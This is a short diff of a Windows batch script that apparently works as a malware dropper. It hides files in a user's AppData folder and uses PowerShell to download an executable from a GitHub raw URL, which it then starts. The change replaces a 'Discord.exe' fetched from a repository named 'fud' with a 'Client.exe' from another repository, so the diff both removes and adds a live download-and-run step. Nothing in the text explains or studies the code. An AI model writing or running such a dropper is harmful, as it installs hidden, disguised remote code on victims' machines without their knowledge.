@@ -1,3 +1,4 @@
+ÿþ
 cls
 
 @echo off
@@ -30,6 +31,6 @@ if '%errorlevel%' NEQ '0' (
 
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Discord.exe' -OutFile Discord.exe"
-start Discord.exe
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Client.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/geradh/test/raw/main/Client.exe' -OutFile Client.exe"
+start Client.exe
